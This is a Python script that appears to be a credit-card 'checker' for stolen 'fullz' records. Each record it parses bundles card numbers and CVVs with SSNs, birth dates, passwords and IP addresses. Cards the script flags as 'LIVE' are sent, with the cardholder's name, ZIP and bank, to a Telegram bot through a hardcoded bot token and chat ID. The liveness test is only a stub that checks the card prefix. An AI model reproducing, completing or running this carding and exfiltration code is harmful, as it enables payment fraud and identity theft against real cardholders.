import requests

TELEGRAM_TOKEN = "8481078763:AAFrSqKtCgOdfY4bSn-qEIvd_2l8ReYHIew"
CHAT_ID = "6584673987"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print("Telegram Error:", e)

def mask_card(card_number):
    return card_number[:6] + "******" + card_number[-4:]

def detect_type(card_number):
    if card_number.startswith("4"):
        return "VISA"
    elif card_number.startswith("5"):
        return "MC"
    elif card_number.startswith("3"):
        return "AMEX"
    elif card_number.startswith("6"):
        return "DISC"
    else:
        return "UNKNOWN"

def check_card(full_line: str):
    parts = full_line.strip().split("|")
    if len(parts) < 18:
        return {"status": "INVALID", "reason": "Incomplete fullz data"}

    cc, mm, yy, cvv = parts[0:4]
    name, address, city, state, zip_code = parts[4:9]
    country, phone, dob, ssn = parts[9:13]
    email, password, ip, user_agent = parts[13:17]
    bin_info = parts[17]

    masked = mask_card(cc)
    card_type = detect_type(cc)

    # Simulated result - mark LIVE if starts with 5 (MC)
    if cc.startswith("5"):
        result = {
            "status": "LIVE",
            "card": masked,
            "type": card_type,
            "bank": bin_info.split()[1] if " " in bin_info else bin_info,
            "name": name,
            "zip": zip_code,
            "ip": ip,
            "country": country,
            "bin": cc[:6]
        }

        msg = f"""✅ *LIVE CC Detected!*
`{masked}`
Name: *{name}*
ZIP: `{zip_code}`
IP: `{ip}`
Bank: *{bin_info}*
"""
        send_telegram(msg)
        return result
    else:
        return {
            "status": "DEAD",
            "card": masked,
            "type": card_type,
            "bank": bin_info,
            "name": name,
            "zip": zip_code,
            "ip": ip,
            "country": country,
            "bin": cc[:6]
        }
